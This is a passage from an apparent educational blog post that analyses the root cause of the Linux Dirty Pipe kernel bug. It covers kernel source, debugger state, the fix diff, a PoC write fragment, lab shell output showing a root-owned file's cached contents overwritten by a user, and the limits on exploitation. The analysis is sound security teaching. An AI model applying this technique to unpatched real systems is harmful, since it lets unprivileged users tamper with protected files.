</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>-&gt;</span><span class=n>offset</span> <span class=o>=</span> <span class=n>offset</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>buf</span><span class=o>-&gt;</span><span class=n>len</span> <span class=o>=</span> <span class=n>bytes</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p><a href=https://elixir.bootlin.com/linux/v5.17.9/source/lib/iov_iter.c#L382 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>We first try to &lsquo;append&rsquo; the current copy operation to an earlier one by increasing the <code>length</code> of the <code>pipe_buffer</code> at <code>head</code>. In case this is not possible, we simply advance the <code>head</code> and put a <em>reference to</em> the page we copy into its <code>page</code> field while making sure that <code>offset</code> and <code>length</code> are set correctly. Indeed, the idea behind the efficiency of <code>sys_splice</code> is to implement it as a <em>zero-copy</em> operation, where pointers and reference counts are used instead of actually duplicating the data.</p><p>Clearly this code potentially reuses the <code>pipe_buffer</code>s (<code>buf = &amp;pipe->bufs[i_head & p_mask]</code>), and thus all fields <em>must</em> be checked and maybe re-initialized (there exist some old values, that might not be correct anymore). In particular, the initialization of the <code>flags</code> is missing. As pointed out by Max Kellermann, it was missing since the <a href=https://github.com/torvalds/linux/commit/241699cd72a8489c9446ae3910ddd243e9b9061b target=_blank rel=noopener>commit</a>
that introduced this function.</p><h3 id=debugger-1>Debugger</h3><p>We can also observe the effect of the zero-copy operation and missing initialization in the debugger. This is the output from earlier,</p><pre tabindex=0><code>struct file at 0xffff8881045b0800
&gt; &#39;f_mapping&#39;: 0xffff8881017d9460
&gt; filename: target_file

struct address_space at 0xffff8881017d9460
&gt; &#39;a_ops&#39;: 0xffffffff82226ce0 &lt;ext4_aops&gt;
&gt; &#39;i_pages.xa_head&#39; : 0xffffea0004156880

struct page at 0xffffea0004156880
&gt; virtual: 0xffff8881055a2000
&gt; data: b&#39;File owned by root!\n&#39;[...]b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
</code></pre><p>and this is the state of the pipe after splicing</p><pre tabindex=0><code>struct pipe_inode_info at 0xffff8881044aec00
&gt; &#39;head&#39;: 2
&gt; &#39;tail&#39;: 1
&gt; &#39;ring_size&#39;: 1
&gt; &#39;bufs&#39;: 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: 0xffffea0004156880                                        &lt;- same page as before
&gt; &#39;offset&#39;: 0
&gt; &#39;len&#39;: 5
&gt; &#39;ops&#39;: 0xffffffff8221cee0 &lt;page_cache_pipe_buf_ops&gt;
&gt; &#39;flags&#39;: PIPE_BUF_FLAG_CAN_MERGE                                  &lt;- flag still set... oopsie :)
</code></pre><p>The data pointer in the <code>struct address_space</code> (which represents the page cache&rsquo;s view on the <code>target_file</code>) and the <code>pipe_buffer</code> at <code>head</code> are equal, while the offset and length reflect what our PoC specified in its call to <code>splice</code>. Note that we are reusing the buffer we emptied earlier, re-initializing all fields <em>but</em> the flags.</p><h2 id=whats-the-actual-problem>What&rsquo;s the Actual Problem?</h2><p>At this point the problem becomes evident. With <strong>anonymous</strong> pipe buffers it is allowed to continue the writing where the previous write stopped, which is indicated by the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag. With the <strong>file-backed buffers</strong>, created by splicing, this should not be allowed by the kernel since those pages are &ldquo;owned&rdquo; by the page cache and not by the pipe.</p><p>Thus, when we <code>splice()</code> the data from a file into a pipe we would have to set <code>buf->flags = 0</code> to indicate that it is not okay to append data to an already existing - not fully written - page (<code>buf->page</code>) since this page belongs to the page cache (the file). When we <code>pipe_write()</code> (or in our program just <code>write()</code>) again we write into the page cache&rsquo;s page because the check <code>buf->flags & PIPE_BUF_FLAG_CAN_MERGE</code> is <code>true</code> (see <code>pipe_write</code> above if you forgot about that part).</p><p>So the main problem is that we start with an anonymous pipe that will then be &ldquo;turned into&rdquo; a file-backed pipe (not the whole pipe but some buffers) by the <code>splice()</code> but the pipe does not get this information since <code>buf->flags</code> is not set to <code>0</code> and thus the merging is still allowed.</p><p>The <a href=https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903 target=_blank rel=noopener>patch</a>
is simply adding the missing initialization.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/lib/iov_iter.c b/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gh>index b0e0acdf96c15e..6dd5330f7a9957 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
</span></span></span><span class=line><span class=cl><span class=gu></span>return 0;
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
</span></span><span class=line><span class=cl><span class=gi>+   buf-&gt;flags = 0;
</span></span></span><span class=line><span class=cl><span class=gi></span>    get_page(page);
</span></span><span class=line><span class=cl>    buf-&gt;page = page;
</span></span><span class=line><span class=cl>    buf-&gt;offset = offset;
</span></span></code></pre></div><p>As we can see above, our PoC arranged for the <code>PIPE_BUF_FLAG_CAN_MERGE</code> flag to be set on the pipe buffer re-used for the splice. Thus, the last write will trigger the bug.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>pause_for_inspection</span><span class=p>(</span><span class=s>&#34;About to write() into page cache&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nf>write</span><span class=p>(</span><span class=n>pipefds</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span> <span class=s>&#34;pwned by user&#34;</span><span class=p>,</span> <span class=mi>13</span><span class=p>)</span> <span class=o>!=</span> <span class=mi>13</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><a href=https://github.com/vobst/lkd-cve/blob/main/lkd_examples/dirtypipe/poc.c#L81 target=_blank rel=noopener><code>⬀ go to source code</code></a></p><p>Back in the debugger, we can see that the final invocation of <code>pipe_write()</code> appends to the partially filled <code>pipe_buffer</code> that is backed by the page cache.</p><pre tabindex=0><code>struct address_space at 0xffff8881017d9460
&gt; &#39;a_ops&#39;: 0xffffffff82226ce0 &lt;ext4_aops&gt;
&gt; &#39;i_pages.xa_head&#39; : 0xffffea0004156880

struct pipe_inode_info at 0xffff8881044aec00
&gt; &#39;head&#39;: 2
&gt; &#39;tail&#39;: 1
&gt; &#39;ring_size&#39;: 1
&gt; &#39;bufs&#39;: 0xffff888101f8a180

struct pipe_buffer at 0xffff888101f8a180
&gt; &#39;page&#39;: 0xffffea0004156880
&gt; &#39;offset&#39;: 0
&gt; &#39;len&#39;: 18
&gt; &#39;ops&#39;: 0xffffffff8221cee0 &lt;page_cache_pipe_buf_ops&gt;
&gt; &#39;flags&#39;: PIPE_BUF_FLAG_CAN_MERGE

struct page at 0xffffea0004156880
&gt; virtual: 0xffff8881055a2000
&gt; data: b&#39;File pwned by user!\n&#39;[...]b&#39;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00&#39;
</code></pre><p>Here we can see that <code>owned by root</code> (starting at index 5 of &ldquo;File owned by root!&rdquo;) has been overwritten with <code>pwned by user</code> in the page cache.</p><p>In the shell we can confirm that the file contents changed for all processes on the system</p><pre tabindex=0><code>user@lkd-debian-qemu:~$ ./poc
user@lkd-debian-qemu:~$ cat target_file
File pwned by user!
user@lkd-debian-qemu:~$ exit
root@lkd-debian-qemu:~# echo 1 &gt; /proc/sys/vm/drop_caches
[  232.397273] bash (203): drop_caches: 1
root@lkd-debian-qemu:~# su user
user@lkd-debian-qemu:~$ cat target_file
File owned by root
</code></pre><p>You can also see that the changes to the file&rsquo;s page cache data are not written back to disk. After clearing the page cache, the old content appears again. But, all other programs would use the modified version from the page cache since the kernel transparently offers you the cached version of the file data (that&rsquo;s the purpose of the page cache).</p><h3 id=limitations>Limitations</h3><p>There are some inherent limitations to the writes that we can perform using this technique that are due to implementation of the pipe and page cache that Max Kellermann mentions:</p><blockquote><p>the attacker must have read permissions (because it needs to splice() a page into a pipe)</p></blockquote><blockquote><p>the offset must not be on a page boundary (because at least one byte of that page must have been spliced into the pipe)</p></blockquote><blockquote><p>the write cannot cross a page boundary (because a new anonymous buffer would be created for the rest)</p></blockquote><blockquote><p>the file cannot be resized (because the pipe has its own page fill management and does not tell the page cache how much data has been appended)</p></blockquote><h2 id=approaches-to-understand-the-bug>Approaches to Understand the Bug</h2><h3 id=top-down-vs-bottom-up-vs-hybrid>Top Down vs. Bottom Up vs. Hybrid</h3><p>Given a PoC and a patch there are different approaches to investigate the vulnerability.</p><ol><li><p><strong>Top Down</strong>: find the <code>splice()</code>, <code>write()</code>, <code>read()</code> system call implementation and go deeper.</p></li><li><p><strong>Bottom Up</strong>: have a look at the fix: <a href=https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903 target=_blank rel=noopener>https://github.com/torvalds/linux/commit/9d2231c5d74e13b2a0546fee6737ee4446017903</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-diff data-lang=diff><span class=line><span class=cl><span class=gh>diff --git a/lib/iov_iter.c b/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gh>index b0e0acdf96c15e..6dd5330f7a9957 100644
</span></span></span><span class=line><span class=cl><span class=gh></span><span class=gd>--- a/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gd></span><span class=gi>+++ b/lib/iov_iter.c
</span></span></span><span class=line><span class=cl><span class=gi></span><span class=gu>@@ -414,6 +414,7 @@ static size_t copy_page_to_iter_pipe(struct page *page, size_t offset, size_t by
</span></span></span><span class=line><span class=cl><span class=gu></span>         return 0;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>     buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
</span></span><span class=line><span class=cl><span class=gi>+    buf-&gt;flags = 0;
</span></span></span><span class=line><span class=cl><span class=gi></span>     get_page(page);
</span></span><span class=line><span class=cl>     buf-&gt;page = page;
</span></span><span class=line><span class=cl>     buf-&gt;offset = offset;
</span></span><span class=line><span class=cl><span class=gu>@@ -577,6 +578,7 @@ static size_t push_pipe(struct iov_iter *i, size_t size,
</span></span></span><span class=line><span class=cl><span class=gu></span>             break;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>         buf-&gt;ops = &amp;default_pipe_buf_ops;
</span></span><span class=line><span class=cl><span class=gi>+        buf-&gt;flags = 0;
</span></span></span><span class=line><span class=cl><span class=gi></span>         buf-&gt;page = page;
</span></span><span class=line><span class=cl>         buf-&gt;offset = 0;
</span></span><span class=line><span class=cl>         buf-&gt;len = min_t(ssize_t, left, PAGE_SIZE);
</span></span></code></pre></div><ul><li>find <code>lib/iov_iter.c</code> (more concrete the functions <code>copy_page_to_iter_pipe()</code> and <code>push_pipe()</code>) and your way back to the system calls.</li></ul></li><li><p><strong>Hybrid</strong>: start from <code>splice()</code> system call but know where we will end (either of the patched functions from above)</p></li></ol><h3 id=linux-kernel-source>Linux Kernel Source</h3><p>Access to the source code:</p><ul><li><a href=https://github.com/torvalds/linux target=_blank rel=noopener>https://github.com/torvalds/linux</a>
+ ctags + cscope (<code>make cscope tags</code>) or an IDE that is capable of creating cross references (might be very resource hungry because of the kernel&rsquo;s size!)</li><li><a href=https://elixir.bootlin.com/linux/v5.17.9/source target=_blank rel=noopener>https://elixir.bootlin.com/linux/v5.17.9/source</a>
(cross references already created + no need for extra tools)</li></ul><p>When reading kernel source code for the first time, you might encounter some obstacles. In general it is easy to get lost and thus you should always keep in mind what it is that you are interested in finding / understanding. We must also understand that it is <em>impossible</em> to understand every line of the code that we look at. Use a best-effort approach to understand the things that get you closer to you goal). You will encounter:</p><ul><li>lots of error checking: in general <em>very</em> interesting, however, here we ignore it (i.e. <code>return -EXYZ</code> code paths)</li><li>many layers of macros, (inlined) function calls and definitions: collect everything and simplify it. Note: you cannot set breakpoints on macros, which might be a problem as well.</li><li>structures full of function pointers:<ul><li>for example, look under &ldquo;Referenced in [&mldr;] files&rdquo; on <a href=https://elixir.bootlin.com target=_blank rel=noopener>https://elixir.bootlin.com</a></li><li>&ldquo;decide&rdquo; for some implementation (in our case ext2 file system)</li></ul></li><li>conditional compilation depending on:<ul><li>compile time options: check the config files you used for your build <code>.config</code></li><li>processor architecture: go for <code>x86-64</code> if present, else take the generic version</li></ul></li></ul><h2 id=conclusion>Conclusion</h2><p>A detailed and streamlined analysis of any bug makes it seem shallow, however, don&rsquo;t get fooled by that impression. Making sense of the bug requires a conceptual understanding of multiple interacting subsystems of the Linux kernel. A root cause analysis without a PoC, blog post, or patch at hand would be a tricky task. In general, the nature of this bug makes it a great opportunity to learn about the Linux kernel. A missing initialization is a welcome diversion from the ubiquitous memory corruption issues (that a lot of exploit developers love ;)). Furthermore, in contrast to those kind of vulnerabilities, the exploitation of this one is almost trivial, stable, and it works across a huge range of Linux distributions. Maybe you got motivated to check out some more complex vulnerabilities / exploits or the Linux kernel yourself :).</p></article></div></div></div></main><footer class="flex flex-none justify-center"><section class="flex flex-col md:flex-row mx-2 md:mx-0 gap-2 md:gap-0 justify-between w-full max-w-4xl lg:max-w-5xl py-6 text-slate-500 dark:text-slate-300"><div class="flex flex-row"></div><div class=grow></div><div class="flex flex-row"><i class="h-6 w-6 flex-none"><svg class="icon icon-tabler icon-tabler-copyright" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M12 12m-9 0a9 9 0 1018 0A9 9 0 103 12"/><path d="M14 9.75a3.016 3.016.0 00-4.163.173 2.993 2.993.0 000 4.154A3.016 3.016.0 0014 14.25"/></svg>
</i>2022 - 2025 lolcads</div><div class="flex flex-row"><span class="ml-0 pl-0 md:ml-2 md:pl-2 border-l-0 md:border-l border-slate-300 dark:border-slate-400">Powered by <a href=https://gohugo.io target=_blank rel=noopener class=underline>Hugo</a> <span class=text-red-600>&#9829;</span> <a href=https://github.com/tomowang/hugo-theme-tailwind target=_blank rel=noopener class=underline>Tailwind</a></span></div></section></footer><script src=/main.min.c6372b6836971865bd94bfde974748aca8415824a2facab6ccd66a87384bfacb.js></script><div class="hidden top-1 right-1" id=code-copy><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-copy" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667A2.667 2.667.0 019.667 7h8.666A2.667 2.667.0 0121 9.667v8.666A2.667 2.667.0 0118.333 21H9.667A2.667 2.667.0 017 18.333z"/><path d="M4.012 16.737A2.005 2.005.0 013 15V5c0-1.1.9-2 2-2h10c.75.0 1.158.385 1.5 1"/></svg></i></div><div class="hidden top-1 right-1" id=code-copy-done><i class="h-6 w-6 block"><svg class="icon icon-tabler icon-tabler-check" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 12l5 5L20 7"/></svg></i></div><script src=/code-copy.min.e7b2a74adef1ed474c335c8bd5e7832b2316b8842b0f9184d65286c5bd64f51a.js></script></body></html>